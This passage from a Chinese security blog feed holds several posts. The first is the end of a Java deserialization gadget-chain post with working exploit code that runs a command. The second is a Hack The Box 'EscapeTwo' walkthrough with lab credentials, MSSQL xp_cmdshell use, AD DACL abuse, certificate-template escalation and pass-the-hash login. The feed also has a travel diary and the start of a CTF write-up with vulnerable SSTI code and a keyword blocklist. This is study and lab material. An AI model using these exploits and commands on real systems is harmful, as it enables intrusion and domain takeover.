clazz);  </span><br><span class="line">        constructor.setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);  </span><br><span class="line">        clazz.addConstructor(constructor);  </span><br><span class="line">        <span class="type">byte</span>[][] bytess = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();  </span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytess);  </span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);  </span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeHashMapByTextAndMnemonicHashMap(node);  </span><br><span class="line">  </span><br><span class="line">        serilize(hashMap);  </span><br><span class="line">        deserilize(<span class="string">&quot;111.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        ObjectOutputStream out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;111.bin&quot;</span>));  </span><br><span class="line">        out.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Hashtable <span class="title function_">makeHashMapByTextAndMnemonicHashMap</span><span class="params">(Object toStringClass)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">tHashMap1</span> <span class="operator">=</span> (Map) getObjectByUnsafe(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">tHashMap2</span> <span class="operator">=</span> (Map) getObjectByUnsafe(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));  </span><br><span class="line">        tHashMap1.put(toStringClass, <span class="string">&quot;123&quot;</span>);  </span><br><span class="line">        tHashMap2.put(toStringClass, <span class="string">&quot;12&quot;</span>);  </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">        hashtable.put(tHashMap1,<span class="number">1</span>);  </span><br><span class="line">        hashtable.put(tHashMap2,<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">        tHashMap1.put(toStringClass, <span class="literal">null</span>);  </span><br><span class="line">        tHashMap2.put(toStringClass, <span class="literal">null</span>);  </span><br><span class="line">        setFieldValue(tHashMap1, <span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);  </span><br><span class="line">        setFieldValue(tHashMap2, <span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);  </span><br><span class="line">        <span class="keyword">return</span> hashtable;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObjectByUnsafe</span><span class="params">(Class clazz)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);  </span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);  </span><br><span class="line">        <span class="keyword">return</span> unsafe.allocateInstance(clazz);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String key, Object val)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();  </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                field = clazz.getDeclaredField(key);  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e)&#123;  </span><br><span class="line">                clazz = clazz.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, val);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserilize</span><span class="params">(String Filename)</span><span class="keyword">throws</span> IOException,ClassNotFoundException&#123;  </span><br><span class="line">        ObjectInputStream in=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        Object obj=in.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还要解释下为什么有这个tHashMap1.put(toStringClass, null); 原因在于要求获取key的value值要为null。</p><img src="/post/d446890f/IMAGE20250130223938898.png" class=""><p>然后为什么要实例化两个TextAndMnemonicHashMap对象是因为在调用reconstitutionPut方法时要调用equals方法进行比较。个人理解以及问的gpt具体没细看。主打一个知道就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loadFactor找不到或者没有定义loadFactor的问题，于是就去找了找这个参数的实际作用到底是什么，实际作用如下： loadFactor（负载因子）定义了 HashMap 在自动扩容之前可以达到的填充度。它是一个介于 0 和 1 之间的浮点数，表示当 HashMap 中的元素个数（容量）达到初始容量（桶数量）乘以 loadFactor 时，HashMap 将进行扩容。 那么为什么没有loadFactor参数就不能进行反序列化呢？ 原因是因为当反序列化要恢复序列化的内容的时候，需要loadFactor才能够知晓扩容的情况，准确恢复反序列化之前的状态。</span><br></pre></td></tr></table></figure><p>解释参考：<br><a href="https://www.aiwin.fun/index.php/archives/4420/#cl-2">https://www.aiwin.fun/index.php/archives/4420/#cl-2</a></p><h3 id="hashmap">hashmap</h3><p>直接参考：<br><a href="https://www.aiwin.fun/index.php/archives/4420/#cl-3">https://www.aiwin.fun/index.php/archives/4420/#cl-3</a></p><p>参考：<br><a href="https://xz.aliyun.com/news/15977">https://xz.aliyun.com/news/15977</a><br><a href="https://www.cnblogs.com/gaorenyusi/p/18411269">https://www.cnblogs.com/gaorenyusi/p/18411269</a><br><a href="https://pankas.top/2024/03/19/dubhectf%E5%9D%90%E7%89%A2%E8%AE%B0%E5%BD%95/#EventListenerList%E8%A7%A6%E5%8F%91toString">https://pankas.top/2024/03/19/dubhectf坐牢记录/#EventListenerList触发toString</a><br><a href="http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html">http://www.bmth666.cn/2024/03/31/第二届-AliyunCTF-chain17复现/index.html</a><br><a href="https://www.aiwin.fun/index.php/archives/4420/">https://www.aiwin.fun/index.php/archives/4420/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前在学习jackson反序列化时通用链是利用的toString方法去触发的而平常通用的就是&lt;code&gt;BadAttributeValueExpException&lt;/code&gt;作为toString的入口。但是之前也看到过其他的绕过方法但是没有记录今天来记录两条新的分别是&lt;c</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="toString" scheme="https://oceanzbz.github.io/tags/toString/"/>
    
  </entry>
  
  <entry>
    <title>EscapeTwo-HTB</title>
    <link href="https://oceanzbz.github.io/post/d3b2c675.html"/>
    <id>https://oceanzbz.github.io/post/d3b2c675.html</id>
    <published>2025-01-29T07:00:59.000Z</published>
    <updated>2025-03-05T07:24:36.810Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>先来进行namap扫描<code>nmap -sV -sC -O 10.10.11.51</code> 结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 15:03 CST</span><br><span class="line">Nmap scan report for 10.10.11.51</span><br><span class="line">Host is up (2.3s latency).</span><br><span class="line">Not shown: 988 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-29 07:05:45Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span><br><span class="line">| Not valid before: 2024-06-08T17:35:00</span><br><span class="line">|_Not valid after:  2025-06-08T17:35:00</span><br><span class="line">|_ssl-date: 2025-01-29T07:09:29+00:00; -1s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span><br><span class="line">| Not valid before: 2024-06-08T17:35:00</span><br><span class="line">|_Not valid after:  2025-06-08T17:35:00</span><br><span class="line">|_ssl-date: 2025-01-29T07:09:26+00:00; 0s from scanner time.</span><br><span class="line">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.11.51:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM</span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   10.10.11.51:1433: </span><br><span class="line">|     Target_Name: SEQUEL</span><br><span class="line">|     NetBIOS_Domain_Name: SEQUEL</span><br><span class="line">|     NetBIOS_Computer_Name: DC01</span><br><span class="line">|     DNS_Domain_Name: sequel.htb</span><br><span class="line">|     DNS_Computer_Name: DC01.sequel.htb</span><br><span class="line">|     DNS_Tree_Name: sequel.htb</span><br><span class="line">|_    Product_Version: 10.0.17763</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2025-01-28T20:40:08</span><br><span class="line">|_Not valid after:  2055-01-28T20:40:08</span><br><span class="line">|_ssl-date: 2025-01-29T07:09:29+00:00; -1s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span><br><span class="line">| Not valid before: 2024-06-08T17:35:00</span><br><span class="line">|_Not valid after:  2025-06-08T17:35:00</span><br><span class="line">|_ssl-date: 2025-01-29T07:09:29+00:00; -1s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span><br><span class="line">| Not valid before: 2024-06-08T17:35:00</span><br><span class="line">|_Not valid after:  2025-06-08T17:35:00</span><br><span class="line">|_ssl-date: 2025-01-29T07:09:26+00:00; 0s from scanner time.</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches for host</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-01-29T07:08:47</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -1s, deviation: 0s, median: -1s</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 386.20 seconds</span><br></pre></td></tr></table></figure><p>可以看到存在smb服务还有mssql数据库服务。<br>使用 smbmap看看文件夹权限<code>smbmap -u rose -p 'KxEPkKe6R8su' -H 10.10.11.51</code></p><img src="/post/d3b2c675/IMAGE20250129163519436.png" class=""><p>看看Accounting Department有什么</p><img src="/post/d3b2c675/IMAGE20250129163819668.png" class=""><p>有两个表格下载下来看看</p><img src="/post/d3b2c675/IMAGE20250129164007891.png" class=""><h2 id="漏洞利用">漏洞利用</h2><p>可以看到有账户密码，又联想到之前mssql端口开放想着去利用下xp_cmdshell，学习到别人使用netexec可以执行命令，先来查看下权限<br><code>nxc mssql 10.10.11.51 -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth --list </code></p><img src="/post/d3b2c675/IMAGE20250129164614297.png" class=""><p>这里其实已经是admin权限了。不用再去提权了不过也记录下提权的命令<br><code>nxc mssql 10.10.11.51 -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth --module mssql_priv</code><br>接下来执行命令利用 <code>-x</code>参数是xp_cmd的形式<br><code>nxc mssql 10.10.11.51 -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -x 'whoami'</code></p><img src="/post/d3b2c675/IMAGE20250129165014817.png" class=""><p>成功执行命令，然后去看一下配置文件</p><p><code>nxc mssql 10.10.11.51 -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -x 'type C:\SQL2019\ExpressAdv_enu\sql-Configuration.INI'</code></p><img src="/post/d3b2c675/IMAGE20250129165203340.png" class=""><p>这里有用户和密码，直接使用winrm登录，但是发现密码不对，去看看还有哪些用户</p><img src="/post/d3b2c675/IMAGE20250129165459038.png" class=""><p>登录ryan试试。</p><img src="/post/d3b2c675/IMAGE20250129165545721.png" class=""><p>成功登录，查看flag即可。</p><h2 id="内网信息收集">内网信息收集</h2><p>使用bloodhound-python收集信息<br><code>bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c All </code></p><img src="/post/d3b2c675/IMAGE20250129175626445.png" class=""><p>可以看到ryan对CAS_CVC用户具有 WriteOwner权限 <code> 此权限允许用户或组修改对象的所有者。</code></p><img src="/post/d3b2c675/IMAGE20250129180054938.png" class=""><p>这里可以看到CA_SVC是证书的发布者，所以思路是修改该用户为ryan</p><h2 id="漏洞利用-2">漏洞利用</h2><p>_具有 ESC1 漏洞的证书模板允许低权限用户代表用户指定的任何域对象注册和请求证书。这意味着任何具有注册权限的用户都可以为特权帐户（如域管理员）请求证书。<br>参考：<br><a href="https://www.cnblogs.com/cyyyyi/p/17797616.html">https://www.cnblogs.com/cyyyyi/p/17797616.html</a><br><a href="https://whoamianony.top/posts/attack-surface-mining-for-ad-cs/">https://whoamianony.top/posts/attack-surface-mining-for-ad-cs/</a></p><p><code>bloodyAD --host 10.10.11.51 -d escapetwo.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan</code></p><img src="/post/d3b2c675/IMAGE20250129180817853.png" class=""><p>然后修改 CA_SVC 的 DACL（DACL 是 ACL 的一种特定类型，用于在 Windows 操作系统中管理对象访问。DACL 是对象安全描述符的一部分，定义了哪些用户或组对对象具有哪些访问权限。DACL 中的每个 ACE（访问控制条目）指定了特定用户或组的权限。）<br>使用<code>impacket-dacledit</code><br><code>impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/&quot;ryan&quot;:&quot;WqSZAF6CysDQbGb3&quot;</code></p><img src="/post/d3b2c675/IMAGE20250129181116158.png" class=""><p>certipy-ad 生成新的密钥凭证，启用基于证书的身份验证，保存的 ccache 文件可以用于 Kerberos 攻击。<br><code>certipy-ad shadow auto -u 'ryan@sequel.htb' -p &quot;WqSZAF6CysDQbGb3&quot; -account 'ca_svc' -dc-ip '10.10.11.51' -target dc01.sequel.htb -ns 10.10.11.51</code></p><img src="/post/d3b2c675/IMAGE20250129182431669.png" class=""><p>修改证书模板，用于可以提升权限，可以允许使用提升的权限颁发证书。<br><code>KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template  -k -template DunderMifflinAuthentication  -target dc01.sequel.htb -dc-ip 10.10.11.51</code></p><img src="/post/d3b2c675/IMAGE20250129182837816.png" class=""><p>请求具有 UPN（用户主体名称）<a href="mailto:Administrator@sequel.htb">Administrator@sequel.htb</a> 的证书，从而启用 Administrator 的账户。<br><code>certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51</code></p><p>使用 Administrator 权限检索 NTLM</p><p><code>certipy-ad auth -pfx administrator_10.pfx -dc-ip 10.10.11.51</code><br>获取到hash之后直接winrm登录即可<br><code>evil-winrm -i 10.10.11.51 -u administrator -H &quot;7a8d4e04986afa8ed4060f75e5a0b3ff&quot;</code></p><p>参考：<br><a href="https://natro92.fun/posts/cbb1724c/#Administrator">https://natro92.fun/posts/cbb1724c/#Administrator</a><br><a href="https://www.hyhforever.top/htb-escapetwo/">https://www.hyhforever.top/htb-escapetwo/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;先来进行namap扫描&lt;code&gt;nmap -sV -sC -O 10.10.11.51&lt;/code&gt; 结果如下&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="windows" scheme="https://oceanzbz.github.io/tags/windows/"/>
    
    <category term="渗透测试" scheme="https://oceanzbz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="HTB" scheme="https://oceanzbz.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>南京游记</title>
    <link href="https://oceanzbz.github.io/post/f07e84c1.html"/>
    <id>https://oceanzbz.github.io/post/f07e84c1.html</id>
    <published>2025-01-26T14:11:30.000Z</published>
    <updated>2025-03-05T07:24:36.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序言">序言</h2><p>其实早就该记录下南京游玩的这几天的，但是因为从南京回来感冒了有点虚没有力气也不想动就拖到了现在记录一下。</p><h2 id="正文">正文</h2><p>我在很本科的时候就有想去旅游的想法，当时还和舍友们一起想着说一起去长沙、云南、西藏去看看，可是也就是嘴上说说一直没去过，说起原因来也是因为兜里没有米，不过也有一些其他琐事忙。不过在这次寒假刚放之后也是有了时间去南京看了看。我认为南京还是有必要在去好多趟的因为我认为这座城市真的是挺不错的也可能我是北方人的缘故。也是第一次在这里感受到江南的风景。第一天去的时候去看了玄武湖的日落美景，感觉坐在那里看的不止是落日美景，你就静静地坐在那里看着平静的湖面，纵使心中有再多的烦躁也能归于平静。看图</p><img src="/post/f07e84c1/IMAGE20250201222428596.png" class=""><p>还去了附近的鸡鸣寺和南京城墙看了看，鸡鸣寺给人一种特别的心灵安抚感。而南京城墙则让人感受到这座城市的历史厚重，走在城墙上可以俯瞰整座城市的风貌，真的能感受到南京的古老与现代交织的魅力。第二天早上起来去了红山动物园转了一圈其实个人给我的感觉还行没有特别惊艳，很适合带着小朋友去感受一波。下午去了附近的总统府都说一座总统府半部近代史在那里几乎承载了整部近代史的波澜壮阔。从这里可以感受到那个时代的历史氛围，无论是建筑风格还是内部的陈设，都让人很容易联想到当时的政治风云。晚上去了秦淮河坐着游船，夜晚的灯光和古老的建筑交相辉映，特别有韵味。也看了夫子庙的灯会。第三天早上去了抖音上推荐的茶南大街吃了一些当地特色的早餐像汤圆、牛肉锅贴、包子还有糕团都是非常好吃。然后准备去遇难者纪念馆看看但是自己没有提前约上也是准备去碰碰运气看看能不能找一个老爷爷或者老奶奶带我们进去，可惜没有好运气，只能作罢。然后就去了3公里以外的德基广场看看他们的网红厕所是怎么个事，去了只能说确实牛逼。下午去梧桐大道和中山陵看了看我感觉梧桐大道非常美丽，拍照非常出片很适合小姐姐去拍照片。这里就不放图片了，因为自己不会拍哈哈。晚上呢去吃了一碗大肉面这个得看一下图天确实好吃就是有点小贵</p><img src="/post/f07e84c1/IMAGE20250201223912197.png" class=""><p>第四天上午去南京博物院看了看，比较印象深刻的是民国馆，走到里面仿佛置身到当时的年代。推推荐！下午去了济南是因为买不到票了擦只能转一下车。不过和老朋友聚了聚，感谢祥哥、欧来来、和taotao的招待，铁锅炖很香，就是手被烫伤了😫。不过下次还来济南转车哈哈哈。<br>以前想出去玩总是说没钱没时间，现在想想其实也都是自己的借口，后面还是要多去看看走走也多去和老朋友聚聚。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;序言&quot;&gt;序言&lt;/h2&gt;
&lt;p&gt;其实早就该记录下南京游玩的这几天的，但是因为从南京回来感冒了有点虚没有力气也不想动就拖到了现在记录一下。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;正文&lt;/h2&gt;
&lt;p&gt;我在很本科的时候就有想去旅游的想法，当时还和舍友们一起想着说一起去长沙、云</summary>
      
    
    
    
    <category term="闲谈" scheme="https://oceanzbz.github.io/categories/%E9%97%B2%E8%B0%88/"/>
    
    
    <category term="闲聊" scheme="https://oceanzbz.github.io/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>2025西湖论剑Wp</title>
    <link href="https://oceanzbz.github.io/post/44a17c03.html"/>
    <id>https://oceanzbz.github.io/post/44a17c03.html</id>
    <published>2025-01-19T04:29:52.000Z</published>
    <updated>2025-03-05T07:24:36.804Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web">Web</h2><h3 id="Rank-l">Rank-l</h3><p>这题一开始看没什么思路，后来通过看响应包发现是python服务器所以想到可能是ssti所以就去试了试，发现在login路由输入payload会在cpass路由中渲染。看看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, abort  </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">  </span><br><span class="line">phone = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_input</span>(<span class="params">user_input</span>):  </span><br><span class="line">    <span class="comment"># unsafe_keywords = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;os&#x27;, &#x27;system&#x27;, &#x27;import&#x27;, &#x27;__import__&#x27;]  </span></span><br><span class="line">    unsafe_keywords = [<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;od&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>,<span class="string">&#x27;awd&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;%2f&#x27;</span>,<span class="string">&#x27;%2F&#x27;</span>]  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> user_input <span class="keyword">for</span> keyword <span class="keyword">in</span> unsafe_keywords):  </span><br><span class="line">    <span class="comment"># if user_input in unsafe_keywords:  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span 